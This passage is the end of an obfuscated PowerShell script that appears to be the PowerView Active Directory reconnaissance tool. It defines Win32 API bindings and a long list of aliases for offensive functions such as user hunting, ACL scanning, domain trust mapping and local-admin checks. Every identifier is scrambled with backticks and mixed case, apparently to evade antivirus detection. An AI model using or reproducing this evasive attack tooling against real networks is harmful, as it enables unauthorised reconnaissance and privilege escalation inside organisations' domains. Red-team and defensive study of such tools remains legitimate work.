    (f`Unc kernE`L32 Clos`EHaN`DLE ([Bool]) @([IntPtr]) -SetLastError)
)

${tYp`es} = ${Fu`NC`TIonDeFI`NiTi`ONs} | ADd`-win3`2ty`pe -Module ${M`Od} -Namespace 'Win32'
${Ne`Tapi32} = ${Typ`ES}['netapi32']
${AD`V`AP`i32} = ${t`yp`eS}['advapi32']
${wT`SAP`i32} = ${t`y`pes}['wtsapi32']
${m`pr} = ${Ty`PES}['Mpr']
${kErn`el`32} = ${t`yPeS}['kernel32']

Set-alI`As ge`T`-`IPaDdreSS rESo`L`VE-IpaDdrE`sS
sE`T-`AliaS c`O`NVErT`-nametosiD C`Onv`erT`TO-SID
s`ET-A`LiaS cONV`E`Rt-S`IDTOnAME cONVER`TfrO`m-S`iD
s`et-`ALIas REQUesT-SPN`T`i`ckEt geT-`DO`Ma`iNsPNTIC`keT
S`eT-Al`IAs GeT-d`N`SzonE G`Et-D`Om`AinDNS`zoNE
set-a`LiAs Ge`T-dNsrec`orD gET`-Do`M`AINDns`RECo`RD
s`et-a`lIas GeT-neT`D`oM`AiN GET-`Do`MAin
SEt-a`l`Ias ge`T`-Ne`T`dOmaincoNTrOl`LeR G`Et-d`OMa`INCOn`TRO`LLeR
S`E`T-`Alias GeT-n`ETf`oREST GET`-`F`OrESt
seT-`A`lIas GeT-nETFO`R`EstDO`MAIn GET-fo`REs`TDOM`AIN
sET`-Ali`As g`et`-nEtF`oR`esTcATaLOG gET-ForEs`T`Globa`LCat`ALog
SeT-`AL`iaS G`et-N`eT`User gEt-`D`O`maInuS`er
Se`T-AL`I`As gEt-U`S`e`REvenT GE`T-dOMa`iNu`SeREv`eNT
se`T-A`lIaS gE`T-NetcoMp`Uter Ge`T-DOmA`iN`C`Om`puTeR
se`T-`ALIas g`e`T-ADOBJ`ECt g`eT-D`o`mAin`oBJeCt
SeT-`AliAs S`Et-A`do`BJeCt sEt-Do`mA`INO`BJecT
SET`-aL`IAs ge`T`-`OBjectaCL G`ET-`dO`Mainob`JECTacL
sEt-ali`AS ADD-ob`J`EC`TA`cL AdD`-D`om`AINO`B`JEcTacL
SeT-`Al`i`AS INVOke-aclS`C`A`NNER f`Ind-INt`EREsTI`NGdomaI`N`ACL
S`e`T-aLIas gET-gU`IDM`Ap GeT-DOma`Ing`U`IDmaP
seT`-alI`AS G`Et`-NeTOU gET-d`O`maiNOU
seT-A`L`I`AS GEt-N`e`Ts`ItE GeT-D`O`MAInS`ITE
SE`T-Al`IAS Ge`T-NeTSUBn`et gEt-DOM`AinS`U`Bn`ET
SeT-`ALI`As g`ET-ne`Tg`RoUp G`et-doma`In`Gr`OUp
SE`T-a`lIAS f`IN`d-`MAnAgED`seCuRitYG`RoUPs GeT-DOmaINM`An`A`GEd`seCURItygr`ouP
SET-`AL`IAS GET-`Ne`TgROupm`EMb`Er g`ET-do`mAiNGROU`P`memBEr
SE`T-A`lias GEt-n`eTfI`lESEr`VeR Get-D`OMai`NFi`LESe`RV`eR
Se`T-AL`IaS GEt`-`Df`SsHARE G`Et-DO`M`AiNd`FSshare
s`Et-`ALias gE`T-N`EtGPo G`ET-DoMa`IngPO
SeT-`A`LIAs g`et-neT`gpOGrO`UP GEt-`D`omA`ingpOlO`c`A`LGroUp
SET-`Al`IAs fiNd-`g`po`lO`CaTION g`ET-doMA`INgpOuSE`Rl`oCAlGrOupMAp`PING
SeT-`AL`IAS fInd-G`po`Co`MPUTeRAdMin geT-D`OMA`i`N`gpoC`OmputeRLO`CAlGrOu`P`ma`ppIng
seT-`AL`IaS GE`T-lo`gge`dOnLoCal geT-reGl`OGg`e`doN
set-`ALi`AS InV`oKE`-`ChEckLocaLA`DMI`NACceSs TEsT-aD`m`IN`A`cCEss
seT-`ALI`AS GeT-s`Ite`N`Ame GET-nETCOMPu`TErs`ITE`Na`ME
S`ET-`Alias Ge`T-proxY gEt-WM`irE`gp`ROXY
S`Et-aLI`As GE`T-l`AS`TlOgGed`oN gET`-wMiregla`S`TLo`GG`eD`On
S`ET-ALi`As geT-cach`eDR`D`pconNE`CTi`oN Get-WmiReg`caChEdr`d`pC`ONNE`ctI`On
SET`-`ALIaS GEt-re`g`IS`TrYMo`UNt`edd`RIVE G`eT`-WM`IregM`oUnT`ed`DrivE
s`eT-`ALiaS Get`-`N`E`TpRoCESs G`E`T-`wMiProcEsS
Se`T-`AlIaS InVo`ke-THrEade`d`FuNCt`I`oN nEw-t`Hre`Ad`E`dFUNCt`ION
se`T-`AliAs I`NvoK`E-UsER`Hu`N`Ter fI`Nd-D`OM`AInUSeR`LOcat`ion
set-a`l`IAS I`Nv`Ok`E-ProcessHUNT`ER FiN`D-DO`MAiNPROce`SS
Se`T-Al`ias iNVo`Ke-E`V`eNthunTeR F`Ind-d`oMaInu`sEReVEnt
S`ET-aL`ias invO`ke-Sh`ArEfInd`Er fI`ND`-`dOMaINs`haRE
set-A`L`iAs iNvOke-`FIl`Ef`i`NDer f`iNd-`INTErESTiN`G`D`o`mainSHAReFILe
Set-`AliaS inv`oke-`enUmE`RaTElO`cA`LAdMIn f`IND-domA`INl`O`caL`GrOUPM`em`BER
Se`T-A`LiAS gEt-NEt`DOm`A`inTRu`ST G`Et-`DOM`AiNTru`st
SET-AL`IAs GeT-`NEt`FORESttr`UsT Ge`T-f`orEstt`RUST
seT`-A`LiaS FInD-F`OrEIgNU`s`ER gEt-domAI`NFo`REig`NUS`er
SE`T-a`lIaS fiN`D-f`orE`iGNGrO`Up GeT-do`mAinf`OReIG`NgRouPm`EmbER
SEt`-AlIaS i`NVokE-mAPdOM`AINT`RuST get-`DOmaInTR`UStMAP`PING
set-`AL`ias GeT-`dom`AInpoL`Icy Get-d`omA`InP`O`LicydAtA

